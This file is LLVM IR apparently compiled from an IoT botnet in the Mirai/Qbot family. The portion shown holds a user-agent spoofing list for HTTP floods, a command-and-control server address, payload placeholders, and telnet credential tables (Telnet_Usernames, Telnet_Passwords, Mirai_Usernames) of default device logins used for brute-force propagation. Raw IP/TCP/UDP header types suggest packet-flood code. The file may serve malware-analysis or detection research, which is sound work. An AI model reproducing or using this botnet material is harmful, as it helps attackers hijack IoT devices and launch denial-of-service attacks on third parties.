; ModuleID = 'host/ir_O0/Galaxy.g.ll'
source_filename = "llvm-link"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.in_addr = type { i32 }
%struct.fd_set = type { [16 x i64] }
%struct.timeval = type { i64, i64 }
%struct.telstate_t = type { i32, i32, i8, i8, i8, i8, i8, i32, i16, i8* }
%struct.__va_list_tag = type { i32, i32, i8*, i8* }
%struct.hostent = type { i8*, i8**, i32, i32, i8** }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.iphdr = type { i8, i8, i16, i16, i16, i8, i8, i16, i32, i32 }
%struct.tcphdr = type { %union.anon }
%union.anon = type { %struct.anon }
%struct.anon = type { i16, i16, i32, i32, i8, i8, i16, i16, i16 }
%struct.tcp_pseudo = type { i64, i64, i8, i8, i16 }
%struct.udphdr = type { %union.anon.1 }
%union.anon.1 = type { %struct.anon.2 }
%struct.anon.2 = type { i16, i16, i16, i16 }
%struct.anon.0 = type { i16, i16, i32, i32, i16, i16, i16, i16 }

@useragents = global [59 x i8*] [i8* getelementptr inbounds ([115 x i8], [115 x i8]* @.str.1, i32 0, i32 0), i8* getelementptr inbounds ([85 x i8], [85 x i8]* @.str.2, i32 0, i32 0), i8* getelementptr inbounds ([150 x i8], [150 x i8]* @.str.3, i32 0, i32 0), i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.4, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.5, i32 0, i32 0), i8* getelementptr inbounds ([55 x i8], [55 x i8]* @.str.6, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.7, i32 0, i32 0), i8* getelementptr inbounds ([85 x i8], [85 x i8]* @.str.8, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @.str.9, i32 0, i32 0), i8* getelementptr inbounds ([48 x i8], [48 x i8]* @.str.10, i32 0, i32 0), i8* getelementptr inbounds ([107 x i8], [107 x i8]* @.str.11, i32 0, i32 0), i8* getelementptr inbounds ([101 x i8], [101 x i8]* @.str.12, i32 0, i32 0), i8* getelementptr inbounds ([63 x i8], [63 x i8]* @.str.13, i32 0, i32 0), i8* getelementptr inbounds ([101 x i8], [101 x i8]* @.str.14, i32 0, i32 0), i8* getelementptr inbounds ([83 x i8], [83 x i8]* @.str.15, i32 0, i32 0), i8* getelementptr inbounds ([173 x i8], [173 x i8]* @.str.16, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.17, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @.str.18, i32 0, i32 0), i8* getelementptr inbounds ([109 x i8], [109 x i8]* @.str.19, i32 0, i32 0), i8* getelementptr inbounds ([82 x i8], [82 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([144 x i8], [144 x i8]* @.str.21, i32 0, i32 0), i8* getelementptr inbounds ([60 x i8], [60 x i8]* @.str.22, i32 0, i32 0), i8* getelementptr inbounds ([103 x i8], [103 x i8]* @.str.23, i32 0, i32 0), i8* getelementptr inbounds ([100 x i8], [100 x i8]* @.str.24, i32 0, i32 0), i8* getelementptr inbounds ([65 x i8], [65 x i8]* @.str.25, i32 0, i32 0), i8* getelementptr inbounds ([154 x i8], [154 x i8]* @.str.26, i32 0, i32 0), i8* getelementptr inbounds ([112 x i8], [112 x i8]* @.str.27, i32 0, i32 0), i8* getelementptr inbounds ([82 x i8], [82 x i8]* @.str.28, i32 0, i32 0), i8* getelementptr inbounds ([65 x i8], [65 x i8]* @.str.29, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.30, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.31, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.32, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.33, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.34, i32 0, i32 0), i8* getelementptr inbounds ([110 x i8], [110 x i8]* @.str.35, i32 0, i32 0), i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.36, i32 0, i32 0), i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.37, i32 0, i32 0), i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.38, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.39, i32 0, i32 0), i8* getelementptr inbounds ([101 x i8], [101 x i8]* @.str.40, i32 0, i32 0), i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.41, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.42, i32 0, i32 0), i8* getelementptr inbounds ([101 x i8], [101 x i8]* @.str.40, i32 0, i32 0), i8* getelementptr inbounds ([70 x i8], [70 x i8]* @.str.43, i32 0, i32 0), i8* getelementptr inbounds ([75 x i8], [75 x i8]* @.str.44, i32 0, i32 0), i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.45, i32 0, i32 0), i8* getelementptr inbounds ([71 x i8], [71 x i8]* @.str.46, i32 0, i32 0), i8* getelementptr inbounds ([128 x i8], [128 x i8]* @.str.47, i32 0, i32 0), i8* getelementptr inbounds ([65 x i8], [65 x i8]* @.str.48, i32 0, i32 0), i8* getelementptr inbounds ([76 x i8], [76 x i8]* @.str.49, i32 0, i32 0), i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.50, i32 0, i32 0), i8* getelementptr inbounds ([65 x i8], [65 x i8]* @.str.51, i32 0, i32 0), i8* getelementptr inbounds ([100 x i8], [100 x i8]* @.str.52, i32 0, i32 0), i8* getelementptr inbounds ([90 x i8], [90 x i8]* @.str.53, i32 0, i32 0), i8* getelementptr inbounds ([111 x i8], [111 x i8]* @.str.54, i32 0, i32 0), i8* getelementptr inbounds ([110 x i8], [110 x i8]* @.str.55, i32 0, i32 0), i8* getelementptr inbounds ([122 x i8], [122 x i8]* @.str.56, i32 0, i32 0), i8* getelementptr inbounds ([116 x i8], [116 x i8]* @.str.57, i32 0, i32 0), i8* getelementptr inbounds ([111 x i8], [111 x i8]* @.str.58, i32 0, i32 0)], align 16
@.str.1 = private unnamed_addr constant [115 x i8] c"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36\00", align 1
@.str.2 = private unnamed_addr constant [85 x i8] c"FAST-WebCrawler/3.6 (atw-crawler at fast dot no; http://fast.no/support/crawler.asp)\00", align 1
@.str.3 = private unnamed_addr constant [150 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; SLCC1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.5.30729; .NET CLR 3.0.30729)\00", align 1
@.str.4 = private unnamed_addr constant [31 x i8] c"TheSuBot/0.2 (www.thesubot.de)\00", align 1
@.str.5 = private unnamed_addr constant [73 x i8] c"Opera/9.80 (X11; Linux i686; Ubuntu/14.10) Presto/2.12.388 Version/12.16\00", align 1
@.str.6 = private unnamed_addr constant [55 x i8] c"BillyBobBot/1.0 (+http://www.billybobbot.com/crawler/)\00", align 1
@.str.7 = private unnamed_addr constant [64 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201\00", align 1
@.str.8 = private unnamed_addr constant [85 x i8] c"FAST-WebCrawler/3.7 (atw-crawler at fast dot no; http://fast.no/support/crawler.asp)\00", align 1
@.str.9 = private unnamed_addr constant [89 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1\00", align 1
@.str.10 = private unnamed_addr constant [48 x i8] c"zspider/0.9-dev http://feedback.redkolibri.com/\00", align 1
@.str.11 = private unnamed_addr constant [107 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)\00", align 1
@.str.12 = private unnamed_addr constant [101 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SV1; .NET CLR 2.0.50727; InfoPath.2)\00", align 1
@.str.13 = private unnamed_addr constant [63 x i8] c"Opera/9.80 (Windows NT 5.2; U; ru) Presto/2.5.22 Version/10.51\00", align 1
@.str.14 = private unnamed_addr constant [101 x i8] c"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36\00", align 1
@.str.15 = private unnamed_addr constant [83 x i8] c"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3\00", align 1
@.str.16 = private unnamed_addr constant [173 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/7046A194ABaiduspider+(+http://www.baidu.com/search/spider.htm)\00", align 1
@.str.17 = private unnamed_addr constant [73 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko\00", align 1
@.str.18 = private unnamed_addr constant [80 x i8] c"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko/20090327 Galeon/2.0.7\00", align 1
@.str.19 = private unnamed_addr constant [109 x i8] c"Opera/9.80 (J2ME/MIDP; Opera Mini/5.0 (Windows; U; Windows NT 5.1; en) AppleWebKit/886; U; en) Presto/2.4.15\00", align 1
@.str.20 = private unnamed_addr constant [82 x i8] c"Mozilla/5.0 (Android; Linux armv7l; rv:9.0) Gecko/20111216 Firefox/9.0 Fennec/9.0\00", align 1
@.str.21 = private unnamed_addr constant [144 x i8] c"Mozilla/5.0 (iPhone; U; CPU OS 3_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B334b Safari/531.21.10\00", align 1
@.str.22 = private unnamed_addr constant [60 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3)\00", align 1
@.str.23 = private unnamed_addr constant [103 x i8] c"Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)\00", align 1
@.str.24 = private unnamed_addr constant [100 x i8] c"Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.56 Safari/536.5\00", align 1
@.str.25 = private unnamed_addr constant [65 x i8] c"Opera/9.80 (Windows NT 5.1; U; en) Presto/2.10.229 Version/11.60\00", align 1
@.str.26 = private unnamed_addr constant [154 x i8] c"Mozilla/5.0 (iPad; U; CPU OS 5_1 like Mac OS X) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B367 Safari/531.21.10 UCBrowser/3.4.3.532\00", align 1
@.str.27 = private unnamed_addr constant [112 x i8] c"Mozilla/5.0 (Nintendo WiiU) AppleWebKit/536.30 (KHTML, like Gecko) NX/3.0.4.2.12 NintendoBrowser/4.3.1.11264.US\00", align 1
@.str.28 = private unnamed_addr constant [82 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:25.0) Gecko/20100101 Firefox/25.0\00", align 1
@.str.29 = private unnamed_addr constant [65 x i8] c"Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)\00", align 1
@.str.30 = private unnamed_addr constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; pl) Opera 11.00\00", align 1
@.str.31 = private unnamed_addr constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; en) Opera 11.00\00", align 1
@.str.32 = private unnamed_addr constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.0; ja) Opera 11.00\00", align 1
@.str.33 = private unnamed_addr constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; cn) Opera 11.00\00", align 1
@.str.34 = private unnamed_addr constant [67 x i8] c"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; fr) Opera 11.00\00", align 1
@.str.35 = private unnamed_addr constant [110 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36\00", align 1
@.str.36 = private unnamed_addr constant [68 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; FSL 7.0.6.01001)\00", align 1
@.str.37 = private unnamed_addr constant [68 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; FSL 7.0.7.01001)\00", align 1
@.str.38 = private unnamed_addr constant [68 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; FSL 7.0.5.01003)\00", align 1
@.str.39 = private unnamed_addr constant [73 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:12.0) Gecko/20100101 Firefox/12.0\00", align 1
@.str.40 = private unnamed_addr constant [101 x i8] c"Mozilla/5.0 (X11; U; Linux x86_64; de; rv:1.9.2.8) Gecko/20100723 Ubuntu/10.04 (lucid) Firefox/3.6.8\00", align 1
@.str.41 = private unnamed_addr constant [68 x i8] c"Mozilla/5.0 (Windows NT 5.1; rv:13.0) Gecko/20100101 Firefox/13.0.1\00", align 1
@.str.42 = private unnamed_addr constant [73 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:11.0) Gecko/20100101 Firefox/11.0\00", align 1
@.str.43 = private unnamed_addr constant [70 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0; .NET CLR 1.0.3705)\00", align 1
@.str.44 = private unnamed_addr constant [75 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64; rv:13.0) Gecko/20100101 Firefox/13.0.1\00", align 1
@.str.45 = private unnamed_addr constant [84 x i8] c"Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)\00", align 1
@.str.46 = private unnamed_addr constant [71 x i8] c"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)\00", align 1
@.str.47 = private unnamed_addr constant [128 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)\00", align 1
@.str.48 = private unnamed_addr constant [65 x i8] c"Opera/9.80 (Windows NT 5.1; U; en) Presto/2.10.289 Version/12.01\00", align 1
@.str.49 = private unnamed_addr constant [76 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)\00", align 1
@.str.50 = private unnamed_addr constant [68 x i8] c"Mozilla/5.0 (Windows NT 5.1; rv:5.0.1) Gecko/20100101 Firefox/5.0.1\00", align 1
@.str.51 = private unnamed_addr constant [65 x i8] c"Mozilla/5.0 (Windows NT 6.1; rv:5.0) Gecko/20100101 Firefox/5.02\00", align 1
@.str.52 = private unnamed_addr constant [100 x i8] c"Mozilla/5.0 (Windows NT 6.0) AppleWebKit/535.1 (KHTML, like Gecko) Chrome/13.0.782.112 Safari/535.1\00", align 1
@.str.53 = private unnamed_addr constant [90 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; MSIE 5.5; Windows NT 5.0) Opera 7.02 Bork-edition [en]\00", align 1
@.str.54 = private unnamed_addr constant [111 x i8] c"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36\00", align 1
@.str.55 = private unnamed_addr constant [110 x i8] c"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36\00", align 1
@.str.56 = private unnamed_addr constant [122 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36\00", align 1
@.str.57 = private unnamed_addr constant [116 x i8] c"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.116 Safari/537.36\00", align 1
@.str.58 = private unnamed_addr constant [111 x i8] c"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36\00", align 1
@mainCommSock = global i32 0, align 4
@currentServer = global i32 -1, align 4
@numpids = global i64 0, align 8
@macAddress = global [6 x i8] zeroinitializer, align 1
@commServer = global [1 x i8*] [i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.59, i32 0, i32 0)], align 8
@.str.59 = private unnamed_addr constant [14 x i8] c"127.0.0.1:760\00", align 1
@Busybox_Payload = global i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.60, i32 0, i32 0), align 8
@.str.60 = private unnamed_addr constant [18 x i8] c"Payload w Busybox\00", align 1
@Payload = global i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.61, i32 0, i32 0), align 8
@.str.61 = private unnamed_addr constant [25 x i8] c"\C2\B4Payload Witout Busybox\00", align 1
@Telnet_Usernames = global [35 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.63, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.63, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.64, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.63, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.65, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.65, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.66, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.63, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.63, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.64, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.67, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.63, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.63, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.65, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.68, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.69, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.65, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.63, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.62, i32 0, i32 0)], align 16
@.str.62 = private unnamed_addr constant [6 x i8] c"root\00\00", align 1
@.str.63 = private unnamed_addr constant [7 x i8] c"admin\00\00", align 1
@.str.64 = private unnamed_addr constant [6 x i8] c"ubnt\00\00", align 1
@.str.65 = private unnamed_addr constant [9 x i8] c"default\00\00", align 1
@.str.66 = private unnamed_addr constant [15 x i8] c"default\00admin\00\00", align 1
@.str.67 = private unnamed_addr constant [8 x i8] c"daemon\00\00", align 1
@.str.68 = private unnamed_addr constant [10 x i8] c"S2fGqNFs\00\00", align 1
@.str.69 = private unnamed_addr constant [7 x i8] c"guest\00\00", align 1
@Telnet_Passwords = global [35 x i8*] [i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.70, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.70, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.71, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.63, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.64, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.72, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.63, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.70, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.68, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.73, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.74, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.74, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.71, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.64, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.70, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.75, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.76, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.77, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.78, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.79, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.80, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.81, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.82, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.83, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.84, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.68, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.70, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.65, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.85, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.86, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.87, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.88, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.89, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.90, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.80, i32 0, i32 0)], align 16
@.str.70 = private unnamed_addr constant [2 x i8] zeroinitializer, align 1
@.str.71 = private unnamed_addr constant [10 x i8] c"password\00\00", align 1
@.str.72 = private unnamed_addr constant [12 x i8] c"adminadmin\00\00", align 1
@.str.73 = private unnamed_addr constant [15 x i8] c"OxhlwSG8\00true\00\00", align 1
@.str.74 = private unnamed_addr constant [6 x i8] c"pass\00\00", align 1
@.str.75 = private unnamed_addr constant [8 x i8] c"asante\00\00", align 1
@.str.76 = private unnamed_addr constant [15 x i8] c"LSiuY7pOmZG2s\00\00", align 1
@.str.77 = private unnamed_addr constant [11 x i8] c"Uq-4GIt3M\00\00", align 1
@.str.78 = private unnamed_addr constant [8 x i8] c"GM8182\00\00", align 1
@.str.79 = private unnamed_addr constant [8 x i8] c"cms500\00\00", align 1
@.str.80 = private unnamed_addr constant [6 x i8] c"anko\00\00", align 1
@.str.81 = private unnamed_addr constant [9 x i8] c"3ep5w2u\00\00", align 1
@.str.82 = private unnamed_addr constant [11 x i8] c"Serv4EMC0\00\00", align 1
@.str.83 = private unnamed_addr constant [9 x i8] c"ROOT500\00\00", align 1
@.str.84 = private unnamed_addr constant [10 x i8] c"tlJwpbo6\00\00", align 1
@.str.85 = private unnamed_addr constant [10 x i8] c"ahetzip8\00\00", align 1
@.str.86 = private unnamed_addr constant [12 x i8] c"inflection\00\00", align 1
@.str.87 = private unnamed_addr constant [10 x i8] c"kont2004\00\00", align 1
@.str.88 = private unnamed_addr constant [16 x i8] c"t0talc0ntr0l4!\00\00", align 1
@.str.89 = private unnamed_addr constant [6 x i8] c"user\00\00", align 1
@.str.90 = private unnamed_addr constant [11 x i8] c"awind5885\00\00", align 1
@Mirai_Usernames = global [34 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.63, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.63, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.63, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.65, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.65, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.66, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.63, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.63, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.64, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.67, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.63, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.63, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.65, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.68, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.69, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.65, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.63, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.62, i32 0, i32 0)], align 16
